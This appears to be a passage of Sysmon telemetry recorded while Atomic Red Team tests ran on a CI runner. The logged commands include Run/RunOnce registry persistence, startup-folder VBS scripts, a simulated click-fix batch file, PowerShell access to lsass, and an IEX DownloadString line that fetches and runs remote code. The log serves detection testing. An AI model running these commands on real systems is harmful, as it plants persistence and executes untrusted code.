"12/17/2025 7:59:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:11.185
ProcessGuid: {f995aebf-62cf-6942-9604-000000000e00}
ProcessId: 8084
Image: C:\Windows\System32\cscript.exe
FileVersion: 10.0.26100.7019
Description: Microsoft ? Console Based Script Host
Product: Microsoft ? Windows Script Host
Company: Microsoft Corporation
OriginalFileName: cscript.exe
CommandLine: ""C:\Windows\system32\cscript.exe"" ""C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9521FCB41599FBEE8F44182F77E19F0FCA97D4E8199B1E8D97FCAD66B5A55DB2
ParentProcessGuid: {f995aebf-62ce-6942-9404-000000000e00}
ParentProcessId: 4320
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""powershell.exe"" & {Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
Copy-Item \""""C:\AtomicRedTeam\atomics\T1547.001\src\vbsstartup.vbs\"""" \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""
cscript.exe \""""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs\""""
cscript.exe \""""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs\""""}
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:11.180
ProcessGuid: {f995aebf-62ce-6942-9404-000000000e00}
ProcessId: 4320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
CreationUtcTime: 2025-12-17 07:59:11.179
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:11.177
ProcessGuid: {f995aebf-62ce-6942-9404-000000000e00}
ProcessId: 4320
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs
CreationUtcTime: 2025-12-17 07:59:11.176
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:10.993
ProcessGuid: {f995aebf-62ce-6942-9404-000000000e00}
ProcessId: 4320
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kqn0xfhv.qec.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:10 AM","13","Registry value set:
RuleName: T1547.001,RunKey
EventType: SetValue
UtcTime: 2025-12-17 07:59:10.657
ProcessGuid: {f995aebf-62ce-6942-9204-000000000e00}
ProcessId: 5196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun
Details: powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")""
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:10.476
ProcessGuid: {f995aebf-62ce-6942-9204-000000000e00}
ProcessId: 5196
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bavnhxhe.zog.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:10.382
ProcessGuid: {f995aebf-62ce-6942-9204-000000000e00}
ProcessId: 5196
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$RunOnceKey = \""""HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\""""
set-itemproperty $RunOnceKey \""""NextRun\"""" 'powershell.exe \""""IEX (New-Object Net.WebClient).DownloadString(`\""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\"""")\""""'}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","13","Registry value set:
RuleName: T1547.001,RunKey
EventType: SetValue
UtcTime: 2025-12-17 07:59:10.157
ProcessGuid: {f995aebf-62ce-6942-9104-000000000e00}
ProcessId: 8348
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1
Details: C:\Path\AtomicRedTeam.dll
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: CreateKey
UtcTime: 2025-12-17 07:59:10.157
ProcessGuid: {f995aebf-62ce-6942-9104-000000000e00}
ProcessId: 8348
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: CreateKey
UtcTime: 2025-12-17 07:59:10.157
ProcessGuid: {f995aebf-62ce-6942-9104-000000000e00}
ProcessId: 8348
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:10 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: CreateKey
UtcTime: 2025-12-17 07:59:10.157
ProcessGuid: {f995aebf-62ce-6942-9104-000000000e00}
ProcessId: 8348
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","13","Registry value set:
RuleName: T1547.001,RunKey
EventType: SetValue
UtcTime: 2025-12-17 07:59:09.889
ProcessGuid: {f995aebf-62cd-6942-8c04-000000000e00}
ProcessId: 6580
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team
Details: C:\Path\AtomicRedTeam.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","12","Registry object added or deleted:
RuleName: T1547.001,RunKey
EventType: CreateKey
UtcTime: 2025-12-17 07:59:09.889
ProcessGuid: {f995aebf-62cd-6942-8c04-000000000e00}
ProcessId: 6580
Image: C:\Windows\system32\reg.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:09.612
ProcessGuid: {f995aebf-62cd-6942-8904-000000000e00}
ProcessId: 7180
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:09 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:09.593
ProcessGuid: {f995aebf-62cd-6942-8804-000000000e00}
ProcessId: 5956
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:08.528
ProcessGuid: {f995aebf-62cc-6942-8604-000000000e00}
ProcessId: 10208
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pbzher40.atc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:08 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:08.054
ProcessGuid: {f995aebf-62cb-6942-8404-000000000e00}
ProcessId: 9796
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cj4l15dr.i2w.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:07.600
ProcessGuid: {f995aebf-62cb-6942-8104-000000000e00}
ProcessId: 6960
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0bgov5ip.5lk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:07.306
ProcessGuid: {f995aebf-62cb-6942-7f04-000000000e00}
ProcessId: 8432
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\a.exe
Hashes: SHA256=16CBE40FB24CE2D422AFDDB5A90A5801CED32EF52C22C2FC77B25A90837F28AD
IsExecutable: true
Archived: true"
"12/17/2025 7:59:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:07.112
ProcessGuid: {f995aebf-62cb-6942-7f04-000000000e00}
ProcessId: 8432
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_k1pf55dc.b4y.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:06.625
ProcessGuid: {f995aebf-62ca-6942-7d04-000000000e00}
ProcessId: 2332
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ghqlg5ar.txn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:06.317
ProcessGuid: {f995aebf-62ca-6942-7b04-000000000e00}
ProcessId: 6560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\PotentiallyUnwanted.exe
Hashes: SHA256=42D6581DD0A2BA9BEC6A40C5B7C85870A8019D7347C9130D24752EC5865F0732
IsExecutable: true
Archived: true"
"12/17/2025 7:59:06 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:06.114
ProcessGuid: {f995aebf-62ca-6942-7b04-000000000e00}
ProcessId: 6560
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_rdv2gg0c.sjr.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.551
ProcessGuid: {f995aebf-62c9-6942-7904-000000000e00}
ProcessId: 2628
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ccejx0lz.4so.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:05.056
ProcessGuid: {f995aebf-62c8-6942-7704-000000000e00}
ProcessId: 9412
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fdczqt2q.taq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:04 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 07:59:04.705
SourceProcessGUID: {f995aebf-62c8-6942-7504-000000000e00}
SourceProcessId: 7936
SourceThreadId: 7428
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {f995aebf-59d7-6942-0d00-000000000e00}
TargetProcessId: 1000
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+34fab0|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2cd8fe|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2ccd3f|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2ccc76|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2cbdf0|UNKNOWN(00007FFB1C300981)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.496
ProcessGuid: {f995aebf-62c8-6942-7504-000000000e00}
ProcessId: 7936
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_bv3murue.03k.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:04 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:04.112
ProcessGuid: {f995aebf-62c8-6942-7304-000000000e00}
ProcessId: 8676
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1ccx2jxr.0t1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:03.737
ProcessGuid: {f995aebf-62c7-6942-7104-000000000e00}
ProcessId: 8508
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wonahc1o.whu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:03 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:03.308
ProcessGuid: {f995aebf-62c7-6942-6e04-000000000e00}
ProcessId: 7700
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.26100.1150 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: ping  localhost -n 2 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=96F2ABAC2542F4CD59628D14AF1F1935FEBFA56C675C3430E108B5465EBC823E
ParentProcessGuid: {f995aebf-62c2-6942-6204-000000000e00}
ParentProcessId: 3140
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\RUNNER~1\AppData\Local\Temp\click-fix.bat"" ""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:03 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:03.035
ProcessGuid: {f995aebf-62c6-6942-6c04-000000000e00}
ProcessId: 2708
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_qgasmtt5.xub.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:02.717
ProcessGuid: {f995aebf-62c6-6942-6b04-000000000e00}
ProcessId: 10000
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:02.699
ProcessGuid: {f995aebf-62c6-6942-6a04-000000000e00}
ProcessId: 928
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:02 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:02.285
ProcessGuid: {f995aebf-62c6-6942-6904-000000000e00}
ProcessId: 8360
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.26100.1150 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: ping  localhost -n 2 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=96F2ABAC2542F4CD59628D14AF1F1935FEBFA56C675C3430E108B5465EBC823E
ParentProcessGuid: {f995aebf-62c2-6942-6204-000000000e00}
ParentProcessId: 3140
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\RUNNER~1\AppData\Local\Temp\click-fix.bat"" ""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:01 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:01.248
ProcessGuid: {f995aebf-62c5-6942-6804-000000000e00}
ProcessId: 896
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.26100.1150 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: ping  localhost -n 2 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=96F2ABAC2542F4CD59628D14AF1F1935FEBFA56C675C3430E108B5465EBC823E
ParentProcessGuid: {f995aebf-62c2-6942-6204-000000000e00}
ParentProcessId: 3140
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\RUNNER~1\AppData\Local\Temp\click-fix.bat"" ""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:00 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:58:58.635
ProcessGuid: {f995aebf-62c2-6942-6004-000000000e00}
ProcessId: 9416
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:00 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:58:58.640
ProcessGuid: {f995aebf-62c2-6942-6004-000000000e00}
ProcessId: 9416
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.103
SourceHostname: runnervm8j6r3.5cxh0c1awo1ufoksjxtfocoz2d.ex.internal.cloudapp.net
SourcePort: 52096
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.111.133
DestinationHostname: cdn-185-199-111-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:59:00 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:00.225
ProcessGuid: {f995aebf-62c4-6942-6704-000000000e00}
ProcessId: 5500
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.26100.1150 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: ping  localhost -n 2 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=96F2ABAC2542F4CD59628D14AF1F1935FEBFA56C675C3430E108B5465EBC823E
ParentProcessGuid: {f995aebf-62c2-6942-6204-000000000e00}
ParentProcessId: 3140
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\RUNNER~1\AppData\Local\Temp\click-fix.bat"" ""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:58:59.194
ProcessGuid: {f995aebf-62c3-6942-6604-000000000e00}
ProcessId: 264
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.26100.1150 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: ping  localhost -n 2 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=96F2ABAC2542F4CD59628D14AF1F1935FEBFA56C675C3430E108B5465EBC823E
ParentProcessGuid: {f995aebf-62c2-6942-6204-000000000e00}
ParentProcessId: 3140
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: C:\Windows\system32\cmd.exe /c """"C:\Users\RUNNER~1\AppData\Local\Temp\click-fix.bat"" ""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:58:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 07:58:59.018
ProcessGuid: {f995aebf-62c2-6942-6504-000000000e00}
ProcessId: 3532
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
